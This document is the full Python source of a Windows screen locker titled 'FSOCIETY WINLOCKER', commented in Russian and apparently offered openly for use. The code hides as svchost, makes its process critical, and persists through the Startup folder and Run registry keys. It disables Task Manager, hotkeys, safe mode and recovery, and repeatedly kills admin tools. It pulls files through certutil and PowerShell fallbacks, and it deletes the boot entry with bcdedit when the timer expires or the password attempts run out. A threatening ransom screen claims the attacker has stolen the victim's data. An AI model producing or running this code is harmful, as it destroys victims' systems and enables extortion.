# ============================================================
# FSOCIETY WINLOCKER v6.3 — ФИНАЛЬНЫЙ РАБОЧИЙ
# GitHub: ippo123459-bit/winlocker
# ============================================================
import subprocess, sys, os, time, threading, tempfile, ctypes, winreg, urllib, random, string

# АВТОУСТАНОВКА ВСЕХ ЗАВИСИМОСТЕЙ
for lib, name in [("cv2", "opencv-python"), ("pygame", "pygame"), ("keyboard", "keyboard"), ("numpy", "numpy")]:
    try:
        __import__(lib)
    except:
        subprocess.check_call([sys.executable, "-m", "pip", "install", name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

import cv2, pygame, keyboard, numpy as np
import tkinter as tk

# ============================================================
# КОНФИГ
# ============================================================
PASSWORD = "1601"
MAX_ATTEMPTS = 5
TIMER_MINUTES = 60
TIMER_FILE = os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), "Microsoft", "Crypto", "RSA", "timer.dat")

VIDEO_URL = "https://github.com/ippo123459-bit/windows-update-helper/releases/download/v1.0/fuxEcorp.mp4"
MUSIC_URL = "https://github.com/ippo123459-bit/windows-update-helper/releases/download/v1.0/locker_music.mp3"

attempts_left = MAX_ATTEMPTS

# ============================================================
# СКАЧИВАНИЕ С ОБХОДОМ БЛОКИРОВОК
# ============================================================
def download_file(url, path):
    if os.path.exists(path) and os.path.getsize(path) > 1000:
        return True
    
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        with urllib.request.urlopen(req, timeout=60) as r, open(path, 'wb') as f:
            f.write(r.read())
        if os.path.getsize(path) > 1000: return True
    except: pass
    
    try:
        import requests
        r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=60)
        with open(path, 'wb') as f: f.write(r.content)
        if os.path.getsize(path) > 1000: return True
    except: pass
    
    try:
        subprocess.run(['powershell', '-Command', f"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('{url}', '{path}')"], capture_output=True, timeout=60)
        if os.path.getsize(path) > 1000: return True
    except: pass
    
    try:
        subprocess.run(['certutil', '-urlcache', '-split', '-f', url, path], capture_output=True, timeout=60)
        if os.path.getsize(path) > 1000: return True
    except: pass
    
    return False

# ============================================================
# СКРЫТИЕ ПРОЦЕССА
# ============================================================
def hide_process():
    try: ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
    except: pass

def protect_process():
    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
    except: pass

# ============================================================
# БЛОКИРОВКА КЛАВИШ
# ============================================================
def block_all_keys():
    for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        try:
            k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(k)
        except: pass
        try:
            k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(k)
        except: pass
    
    keys = ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','delete']
    for k in keys:
        try: keyboard.block_key(k)
        except: pass
    
    combos = ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v']
    for c in combos:
        try: keyboard.add_hotkey(c, lambda: None, suppress=True)
        except: pass

def unblock_all():
    try: ctypes.windll.user32.BlockInput(False)
    except: pass
    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0)
    except: pass
    try: keyboard.unhook_all()
    except: pass
    for hkey in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        try:
            k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(k)
        except: pass
        try:
            k = winreg.OpenKey(hkey, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(k)
        except: pass

# ============================================================
# УБИЙЦА ПРОЦЕССОВ
# ============================================================
def kill_all():
    while True:
        for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe","procmon.exe","mmc.exe"]:
            try: os.system(f"taskkill /f /im {p} >nul 2>&1")
            except: pass
        time.sleep(0.1)

# ============================================================
# ТАЙМЕР
# ============================================================
def get_timer():
    try:
        if os.path.exists(TIMER_FILE):
            with open(TIMER_FILE, 'r') as f: return float(f.read().strip())
    except: pass
    end = time.time() + (TIMER_MINUTES * 60)
    try:
        os.makedirs(os.path.dirname(TIMER_FILE), exist_ok=True)
        with open(TIMER_FILE, 'w') as f: f.write(str(end))
    except: pass
    return end

def timer_check():
    while True:
        try:
            if get_timer() - time.time() <= 0: destroy_windows()
        except: pass
        time.sleep(5)

# ============================================================
# УНИЧТОЖЕНИЕ WINDOWS
# ============================================================
def destroy_windows():
    try: os.system("bcdedit /delete {current} /f >nul 2>&1")
    except: pass
    os.system("shutdown /r /t 0 /f")
    os._exit(0)

# ============================================================
# АВТОЗАГРУЗКА
# ============================================================
def add_startup():
    try:
        src = os.path.abspath(sys.argv[0])
        dst = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'svchost.pyw')
        with open(src, 'r', encoding='utf-8') as f: code = f.read()
        with open(dst, 'w', encoding='utf-8') as f: f.write(code)
    except: pass
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{os.path.abspath(sys.argv[0])}"')
        winreg.CloseKey(k)
    except: pass
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{os.path.abspath(sys.argv[0])}"')
        winreg.CloseKey(k)
    except: pass

def block_safe_mode():
    try:
        os.system("bcdedit /deletevalue {current} safeboot >nul 2>&1")
        os.system("bcdedit /set {current} recoveryenabled no >nul 2>&1")
    except: pass

# ============================================================
# АНИМАЦИЯ FSOCIETY
# ============================================================
def anim_fsociety():
    a = tk.Tk()
    a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True)
    a.protocol("WM_DELETE_WINDOW", lambda: None)
    lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 50, 'bold'))
    lbl.pack(expand=True)
    for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
        lbl.config(text=t); a.update(); time.sleep(0.3)
    time.sleep(1)
    sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 20))
    sub.pack(pady=20)
    for i in range(len("ТЕБЯ ВИДИТ")+1):
        sub.config(text="ТЕБЯ ВИДИТ"[:i]); a.update(); time.sleep(0.1)
    time.sleep(2); a.destroy()

# ============================================================
# ВИДЕО
# ============================================================
def play_video():
    video_path = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4")
    if not download_file(VIDEO_URL, video_path): return
    
    try:
        pygame.mixer.init(); pygame.mixer.music.load(video_path); pygame.mixer.music.play()
    except: pass
    
    try:
        cap = cv2.VideoCapture(video_path)
        if not cap.isOpened(): return
        fps = cap.get(cv2.CAP_PROP_FPS) or 30
        cv2.namedWindow("FSOCIETY", cv2.WND_PROP_FULLSCREEN)
        cv2.setWindowProperty("FSOCIETY", cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        while cap.isOpened():
            ret, frame = cap.read()
            if not ret: break
            cv2.imshow("FSOCIETY", frame)
            cv2.waitKey(int(1000/fps))
        cap.release(); cv2.destroyAllWindows()
        for _ in range(10): cv2.waitKey(1)
    except: pass
    
    try: pygame.mixer.music.stop()
    except: pass

# ============================================================
# ВИНЛОКЕР
# ============================================================
class WinLocker:
    def __init__(self):
        global attempts_left
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
        self.win.configure(bg='black'); self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None)
        self.win.bind("<Alt-F4>", lambda e: None); self.win.bind("<Escape>", lambda e: None)
        self.win.focus_force()
        self.timer_end = get_timer()
        self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
        self.timer_label.place(relx=0.5, rely=0.08, anchor='center')
        self.update_timer()
        
        try:
            music_path = os.path.join(tempfile.gettempdir(), "locker_music.mp3")
            download_file(MUSIC_URL, music_path)
            if os.path.exists(music_path) and os.path.getsize(music_path) > 1000:
                pygame.mixer.init(); pygame.mixer.music.load(music_path); pygame.mixer.music.set_volume(1.0); pygame.mixer.music.play(-1)
        except: pass
        
        msg = f"""Вот чего доводит интернет.

Вот смотри, ты скачивал игры или что там из интернета?
Вот доскачался. Сиди и жуй мой винлокер.

FSOCIETY тебя приветствует!

Смотри, ты хочешь перезагрузить ПК? У тебя не получится.
ПК перезагрузить получится, но избавиться от меня - нет.
Я везде. Я в твоём роутере.
Я знаю все твои данные.
У меня есть cookies файлы, пароли, логины, почты и т.д.

МЫ FSOCIETY.
YOU FUCK.

ПОПЫТОК: {MAX_ATTEMPTS}"""
        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier', 10, 'bold'), justify='center').place(relx=0.5, rely=0.45, anchor='center')
        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.82, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier', 14, 'bold')).pack(pady=(0,5))
        self.pw = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='white', fg='black', relief='solid', bd=2)
        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier', 12, 'bold'))
        self.sl.pack()
        self.pw.bind('<Return>', self.check); self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def update_timer(self):
        remaining = self.timer_end - time.time()
        if remaining <= 0: destroy_windows()
        h, m, s = int(remaining//3600), int((remaining%3600)//60), int(remaining%60)
        self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
        self.win.after(1000, self.update_timer)
    
    def _keep(self):
        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            try: pygame.mixer.music.stop()
            except: pass
            unblock_all(); self.sl.config(text="ВЕРНО!", fg='white'); self.win.update()
            try: os.remove(TIMER_FILE)
            except: pass
            time.sleep(1); self.root.destroy(); os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
            else:
                try: pygame.mixer.music.stop()
                except: pass
                self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.update()
                time.sleep(2); destroy_windows()
            self.pw.delete(0, tk.END)

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == "__main__":
    hide_process(); protect_process()
    threading.Thread(target=kill_all, daemon=True).start()
    threading.Thread(target=timer_check, daemon=True).start()
    add_startup(); block_safe_mode()
    anim_fsociety(); play_video(); block_all_keys()
    WinLocker(); tk.mainloop()
